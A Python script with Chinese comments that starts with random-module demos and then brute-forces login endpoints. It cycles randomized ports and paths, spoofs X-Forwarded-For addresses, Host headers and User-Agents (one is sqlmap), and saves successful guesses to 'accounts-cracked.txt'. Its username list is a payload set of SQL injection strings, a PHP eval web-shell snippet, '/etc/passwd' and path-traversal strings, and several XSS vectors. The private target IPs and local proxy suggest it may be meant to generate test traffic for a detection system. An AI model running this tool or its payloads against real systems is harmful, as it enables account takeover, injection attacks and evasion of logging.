#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests
import time
import random
import string

# 随机整数：
print(random.randint(1,50))

# 随机选取0到100间的偶数：
print(random.randrange(0, 101, 2))

# 随机浮点数：
print(random.random())
print(random.uniform(1, 10))

# 随机字符：
print(random.choice('abcdefghijklmnopqrstuvwxyz!@#$%^&*()'))

# 多个字符中生成指定数量的随机字符：
print(random.sample('zyxwvutsrqponmlkjihgfedcba',5))

# 从a-zA-Z0-9生成指定数量的随机字符：
ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
print(ran_str)

# 多个字符中选取指定数量的字符组成新字符串：
print(''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], 5)))

# 随机选取字符串：
print(random.choice(['剪刀', '石头', '布']))

# 打乱排序
items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
print(random.shuffle(items))

outFile = open('accounts-cracked.txt', 'w')
def getRandomIPv4():
    a = 500
    while a<0 or a>256:
        a = random.randint(0,5)+random.randint(0,10)+random.randint(0,256)
    b = 500
    while b<0 or b>256:
        b = random.randint(0,2)+random.randint(0,5)+random.randint(0,256)
    c = 500
    while c<0 or c>256:
        c = random.randint(0,2)+random.randint(0,3)+random.randint(0,256)
    d = 500
    while d<0 or d>256:
        d = random.randint(1,254)
    return str(a)+"."+str(b)+"."+str(c)+"."+str(d)

def brute_force(user, password):
    port_list =["80","81","8080","7000","8092","5001","3389","514","21","514","514","22"]
    port_list =["7000"]
    port = random.choice(port_list)
    domain = random.choice(["172.16.95.25:"+port, "10.10.67.180:514/weibo"])
    #domain = random.choice(["s.weibo.com:80/weibo","s.weibo.com:80/weibo/baidu?wd="])
    name = user.strip()
    passwd = password.strip()
    proxy = {"http":"127.0.0.1:8080"}
    houzui_list = [".jsp",".asp",".php"," ",".html",".js",".jpg",".ico",".htm", "/",".html",".html",".aspx"]
    pathExp = ''.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], random.randint(1,5)+random.randint(0,3))) + random.choice(houzui_list)
    path_list = ["login/","index","html12/","phpadmin.php","/access.jsp"]
    path_list = path_list + [pathExp,pathExp,pathExp,pathExp,pathExp]
    #path_list = path_list + ["1.jpg","2.txt","3.js","4.mp4","5.mp3","6.png"]
    path = "/" + random.choice(path_list)
    url = "http://"+domain+path
    CT = "application/x-www-form-urlencoded"
    user_agent_list = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60",
    "Opera/8.0 (Windows NT 5.1; U; en)",
    "Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2 ",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E) ",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
    "Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10",
    "Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",
    "Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0",
    "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)",
    "UCWEB7.0.2.37/28/999",
    "NOKIA5700/ UCWEB7.0.2.37/28/999",
    "Openwave/ UCWEB7.0.2.37/28/999",
    "Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:69.0) Gecko/20100101 Firefox/69.0",
    ]
    user_agent_list +=["CC tools","Curl 7.1","sqlmap 2.7"]
    user_agent = random.choice(user_agent_list)
    #user_agent = "java CC webmagic"
    AE = "gzip, deflate"
    ip_random=getRandomIPv4()
    #ip_random = "172.16.114.11"
    host_list = ["news.16312.cn","scjg.gswdc.cn","jg.acdc.cn","www.csdfsa.com"]
    if "8092" in url or "baidu" in url:
        HostExp = "www.baidu.com"
    elif "514" in url or "weibo" in url:
        HostExp = "s.weibo.com"
    else:
        HostExp = random.choice(host_list)
    appcookie = "BjplLUIONFs1KteXW9DZDU8lWrhi3wqvSyXoUNYo9XRSLhDb8FGChywp78WDSO3Nf2tTARohPSAmskgUIreF5s14zB26wOuk3cY-mK3VnnWlLqOH-k-Oak8HFeHx8wy0QfDP_c0m80giM0_-WeoRR_WbPW_ukpXnnFIHPpSUHAZECH77Bo86G_Ycj8J..FNGmgF9stidKmf2kYicPA4taTiqHQ9Z45aiCxsjVn-KVN1ysvAKwG3UkijYkIrVDuWMHsjSsPvlAtccvtbTjX-Gvx16ojwpG8zoKrO2jHYPuz5V1R0fS8Ki6QKPhv_sk-iqiA5lcmiNXX_akIuUnZQvhYz4eGC90h1x187jLXH_wuIV1PPRL-bHprZnWlOQer2PrimNRZZqoXmq_2SagCswTtkfCGWLvZBT344AjpzSlw5zP_WDXnO8rkKaoCwtwwTcByfvAt7uOQv_OdVjJ1PgmrVsKv8H3SNN5qyc4hYFyb51oJU_U6oD42XWYkxdzE7L36j1OZfimr-H5H_jjcUf8jAsyKuSw6wmvjYjpV5jok_GYAy4e-aBE7SKuI7p_wtxieYFrZl6ig9flL_N7zCquz19luX60xiiGjjONso70J_wheHePkRLi6bxnzF3M4e-7YmnNW5Gu8937fHC83B2R5uttMjQR4dlRYc_yYs2u3qV2dO6-yqsrikGHihOMzHhx5qT_QFNSx.871J9N4O"
    header = {"Content-Type":CT,"User-Agent":user_agent,"Accept-Encoding":AE, "X-Forwarded-For":ip_random}
    header = {"Host":HostExp,"Content-Type":CT,"User-Agent":user_agent,"Accept-Encoding":AE, "X-Forwarded-For":ip_random}
    header_appcookie = dict({"wfaCdxkF":appcookie}, **header)
    #print(header_appcookie)
    #data = name + '&' + passwd
    data = "uid=" + name + '&' + "passw=" + passwd
    print("\ndata:",data)
    try:
        #response = requests.post(url,headers=header,data=data,allow_redirects=False,proxies=proxy,timeout=2)
        response = requests.get(url,headers=header,allow_redirects=False,proxies=proxy,timeout=random.uniform(0, 1))
        if "user_name" in response.text:
            print("\n状态码:", response.status_code, "  [+]获得用户信息>>>", response.text)
            outFile.write(name + ':' + passwd+'\n' )
        else:
            #print('----- error user:', name, ' with password:',passwd, '-----')
            print("\n状态码:", response.status_code, "  [-]未获得用户信息>>>", user, response.text[:5])
            pass
    except Exception as e:
        print("[!]e:",e)
    #print(name,passwd)
    #print(response.text)
    return
    
def main():
    '''
    with open('user.txt', 'r') as userline:
        y = userline.readlines()
        with open('pass.txt', 'r') as passline:
            b= passline.readlines()
            for u in y:
                for p in b:
                    brute_force(user=u,password=p)
    '''
    zidian_u = ["admin", "qiqi", "feifei", "liyi", "haha","zhangdm","limumu","limu","lanyu","huwei","zhangyu","yanglin"]
    zidian_u = zidian_u + ["select length(name) from message.users","'or 1=1","'and 1=1","select * from","1' union select 1,2","select count(schema_name) from"]
    zidian_u += ["@eval($_POST[a])", "CMD","/etc/passwd","ping 8.8.8.8","/bin/bash","../../../../etc"]
    zidian_u += ["<button onclick=`alert(${name})`></button>","<script>alert(xss)</script>","<sCript>alert(1);</scrIpt>","<svg/onload=alert(document.domain)>","<img src=N onerror=\"eval(String.fromCharCode(97))\">"]
    zidian_p = ["123456"]
    for u in zidian_u:
        for p in zidian_p:
            brute_force(user=u,password=p)
            time.sleep(random.uniform(0, 0.1))

if __name__ == '__main__':
    main()
    for i in range(1000):
        pass
        main()

outFile.close()
with open('accounts-cracked.txt','r') as text:
    list = text.readlines()
    sum=len(list)

if sum>0:
    print(u"获得%r条用户信息" %sum)

else:
    print(u"获得0条用户信息")


